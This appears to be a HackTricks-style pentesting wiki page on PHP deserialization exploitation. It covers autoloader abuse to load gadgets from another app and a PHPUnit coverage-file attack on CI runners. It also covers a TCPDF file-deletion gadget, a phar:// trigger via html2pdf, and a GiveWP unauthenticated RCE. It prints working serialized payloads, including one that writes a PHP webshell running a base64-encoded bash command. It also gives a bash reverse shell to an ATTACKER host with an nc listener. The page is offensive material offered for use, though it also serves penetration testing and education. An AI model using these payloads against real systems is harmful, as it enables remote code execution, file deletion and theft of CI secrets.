_body: "# PHP - Deserialization + Autoload Classes\n\n{{#include ../../banners/hacktricks-training.md}}\n\nFirst, you should\
  \ check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).\n\n## PHP deserialization\
  \ + spl_autoload_register + LFI/Gadget\n\nWe are in a situation where we found a **PHP deserialization in a webapp** with\
  \ **no** library vulnerable to gadgets inside **`phpggc`**. However, in the same container there was a **different composer\
  \ webapp with vulnerable libraries**. Therefore, the goal was to **load the composer loader of the other webapp** and abuse\
  \ it to **load a gadget that will exploit that library with a gadget** from the webapp vulnerable to deserialization.\n\n\
  Steps:\n\n- You have found a **deserialization** and there **isn’t any gadget** in the current app code\n- You can abuse\
  \ a **`spl_autoload_register`** function like the following to **load any local file with `.php` extension**\n  - For that\
  \ you use a deserialization where the name of the class is going to be inside **`$name`**. You **cannot use \"/\" or \"\
  .\"** in a class name in a serialized object, but the **code** is **replacing** the **underscores** (\"_\") **for slashes**\
  \ (\"/\"). So a class name such as `tmp_passwd` will be transformed into `/tmp/passwd.php` and the code will try to load\
  \ it.\\\n    A **gadget example** will be: **`O:10:\"tmp_passwd\":0:{}`**\n\n<details>\n<summary>spl_autoload_register autoload\
  \ example</summary>\n\n```php\nspl_autoload_register(function ($name) {\n\n   if (preg_match('/Controller$/', $name)) {\n\
  \       $name = \"controllers/${name}\";\n   } elseif (preg_match('/Model$/', $name)) {\n       $name = \"models/${name}\"\
  ;\n   } elseif (preg_match('/_/', $name)) {\n       $name = preg_replace('/_/', '/', $name);\n   }\n\n   $filename = \"\
  /${name}.php\";\n\n   if (file_exists($filename)) {\n       require $filename;\n   }\n   elseif (file_exists(__DIR__ . $filename))\
  \ {\n       require __DIR__ . $filename;\n   }\n});\n```\n\n</details>\n\n> [!TIP]\n> If you have a **file upload** and\
  \ can upload a file with **`.php` extension** you could **abuse this functionality directly** and get already RCE.\n\nIn\
  \ my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with\
  \ a **library vulnerable to a `phpggc` gadget**.\n\n- To load this other library, first you need to **load the composer\
  \ loader of that other web app** (because the one of the current application won’t access the libraries of the other one.)\
  \ **Knowing the path of the application**, you can achieve this very easily with: **`O:28:\"www_frontend_vendor_autoload\"\
  :0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)\n- Now, you can **load** the others\
  \ **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**,\
  \ which allowed me to **write any file inside the filesystem**.\n  - NOTE: The **generated gadget was not working**, in\
  \ order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes\
  \ **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have\
  \ any values.\n- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**,\
  \ but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a\
  \ serialized array with both objects like:\n  - You can see **first the loader being loaded and then the payload**\n\n```php\n\
  a:2:{s:5:\"Extra\";O:28:\"www_frontend_vendor_autoload\":0:{}s:6:\"Extra2\";O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:7:\"\
  cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:4:\"data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"\
  Value\";s:56:\"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>\";}}}s:10:\"strictMode\";N;s:8:\"filename\";s:10:\"\
  /tmp/a.php\";s:19:\"storeSessionCookies\";b:1;}}\n```\n\n- Now, we can **create and write a file**, however, the user **couldn’t\
  \ write in any folder inside the web server**. So, as you can see in the payload, PHP calling **`system`** with some **base64**\
  \ is created in **`/tmp/a.php`**. Then, we can **reuse the first type of payload** that we used to as LFI to load the composer\
  \ loader of the other webapp t**o load the generated `/tmp/a.php`** file. Just add it to the deserialization gadget:\n\n\
  ```php\na:3:{s:5:\"Extra\";O:28:\"www_frontend_vendor_autoload\":0:{}s:6:\"Extra2\";O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\"\
  :4:{s:7:\"cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:4:\"data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\"\
  ;b:0;s:5:\"Value\";s:56:\"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>\";}}}s:10:\"strictMode\";N;s:8:\"filename\"\
  ;s:10:\"/tmp/a.php\";s:19:\"storeSessionCookies\";b:1;}s:6:\"Extra3\";O:5:\"tmp_a\":0:{} }\n```\n\n**Summary of the payload**\n\
  \n- **Load the composer autoload** of a different webapp in the same container\n- **Load a phpggc gadget** to abuse a library\
  \ from the other webapp (the initial webapp vulnerable to deserialization didn’t have any gadget on its libraries)\n- The\
  \ gadget will **create a file with a PHP payload** on it in /tmp/a.php with malicious commands (the webapp user cannot write\
  \ in any folder of any webapp)\n- The final part of our payload will use **load the generated php file** that will execute\
  \ commands\n\nI needed to **call this deserialization twice**. In my testing, the first time the `/tmp/a.php` file was created\
  \ but not loaded, and the second time it was correctly loaded.\n\n### Recent phpggc goodies (2025)\n\n- The **phpggc master\
  \ branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 and others landed in 2025 —\
  \ useful when the target app shares vendor code with those projects. A quick way to search is `phpggc -l | grep -E \"OpenCart|Drupal|Yoast\"\
  ` (update your clone first).\n- When mixing gadgets across apps via autoloading, remember **private properties in gadget\
  \ definitions may be dropped** when classes are re-declared differently in the target; edit the gadget’s `chain.php` to\
  \ make properties `public` if the payload arrives with empty values (same trick shown above).\n\n## PHPUnit PHPT coverage\
  \ deserialization (CI/CD entrypoint)\n\n`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765)\
  \ unserialized arbitrary PHP objects from `.coverage` files produced by the **PHPT runner**. In CI pipelines where untrusted\
  \ contributors can push tests, dropping a crafted `.coverage` file triggers deserialization as soon as the suite runs —\
  \ no web access needed.\n\n**Attack flow**\n\n1. Place a malicious `.coverage` file in the repo (or artifact) containing\
  \ a serialized gadget that exists in the test dependencies (e.g., a Monolog or Guzzle chain from phpggc).\n2. Submit a PR;\
  \ when CI executes `phpunit --configuration phpunit.xml`, the PHPT runner reads the coverage file and deserializes the gadget,\
  \ giving **RCE inside the runner container**.\n3. This is especially nasty when tests mount CI secrets (cloud creds, deployment\
  \ keys).\n\n**Minimal malicious coverage stub** (drop alongside a PHPT test):\n```php\n<?php\n$payload = file_get_contents('php://stdin');\
  \ // serialized gadget from phpggc\nfile_put_contents('exploit.coverage', $payload);\n```\nRun the PHPT so phpunit consumes\
  \ `exploit.coverage`.\n\n## TCPDF `__destruct` POP chain for arbitrary file deletion\n\nWhen a real `TCPDF` instance is\
  \ garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like\
  \ a cache file under `K_PATH_CACHE`. If an application performs `unserialize($user_data)` while the `TCPDF` class is loaded\
  \ (e.g. it expects an array with an `html` key), you can supply a serialized object that sets:\n\n- `file_id` to any integer\
  \ that is not present in `self::$cleaned_ids` (e.g. `-1`).\n- `imagekeys` to paths that begin with `K_PATH_CACHE` or that\
  \ can be made to look like it (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).\n\nExample\
  \ payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:\n\n```text\na:1:{s:4:\"\
  html\";O:5:\"TCPDF\":2:{s:7:\"file_id\";i:-1;s:9:\"imagekeys\";a:1:{i:0;s:39:\"/tmp/../tmp/do_not_delete_this_file.txt\"\
  ;}}}\n```\n\nThe file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove\
  \ paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes,\
  \ so older `Producer` versions are prime targets.\n\n### Triggering the gadget via `phar://` in html2pdf `<cert>` tags\n\
  \n`spipu/html2pdf` (≤5.3.0) wraps TCPDF and exposes a custom `<cert>` block whose `src`/`privkey` attributes are validated\
  \ with plain `file_exists()`. On PHP < 8.0 any filesystem function that touches a `phar://` URL causes the Phar metadata\
  \ to be unserialized. By storing the malicious TCPDF object above inside a Phar archive you gain a reliable POP even if\
  \ the application never calls `unserialize()` itself.\n\n1. Craft a Phar with `phar.readonly=0`, set the stub/manifest to\
  \ look like an image (e.g. rename `archive.phar` to `archive.png`), and store the serialized TCPDF object in the Phar metadata.\n\
  2. Upload/place the file somewhere reachable such as `/tmp/user_files/user_1/archive.png`.\n3. Submit HTML containing the\
  \ CERT tag so html2pdf resolves the attacker-controlled path:\n\n```html\n<cert src=\"phar:///tmp/user_files/user_1/archive.png\"\
  \n      privkey=\"phar:///tmp/user_files/user_1/archive.png\" />\n```\n\nThe call to `file_exists()` deserializes the metadata,\
  \ instantiates TCPDF, and its destructor deletes the chosen file, turning html2pdf into a powerful `phar://` entry point.\
  \ Version 5.3.1 added `Security::checkValidPath()` to block unapproved schemes, so legacy deployments remain attractive.\n\
  \n### GiveWP <3.14.2 unauthenticated POP chain to RCE (CVE-2024-5932)\n\n**GiveWP** (WordPress donation plugin) up to **3.14.1**\
  \ unserializes the user-controlled **`give_title`** field during `give_process_donation` without authentication. With the\
  \ plugin’s dependencies autoloaded you get a **POP chain** that reaches a callable sink.\n\n- The EQSTLab PoC builds a chain\
  \ using `Stripe\\StripeObject` and `Give\\Vendors\\Faker\\ValidGenerator`, sets the internal `\\0*\\0validator` to `shell_exec`,\
  \ and tucks the attacker command in `Give\\Onboarding\\SettingsRepository` data.\n- POST the serialized payload as `give_title`\
  \ to any donation form endpoint (e.g. `/donations/<slug>/`) with the offline gateway so no payment is attempted:\n\n```http\n\
  POST /donations/the-things-we-need/ HTTP/1.1\nHost: giveback.htb\nContent-Type: application/x-www-form-urlencoded\n\namount=5&give-form-id=1&give-form-title=Any&give-gateway=offline&action=give_process_donation&give_title=O:31:\"\
  Stripe\\StripeObject\":1:{...serialized payload...}\n```\n\n- Output is **blind**, so use a **callback payload** such as\
  \ a Bash reverse shell: `bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"` and listen with `nc -lnvp PORT`.\n- The same\
  \ chain can delete arbitrary files by pointing the sink at `unlink`. Use **phpggc** or the PoC (Python + `uv run CVE-2024-5932-rce.py\
  \ -u <form_url> -c '<cmd>'`) to craft the blob, but any serializer able to emit PHP objects works.\n\n## References\n\n\
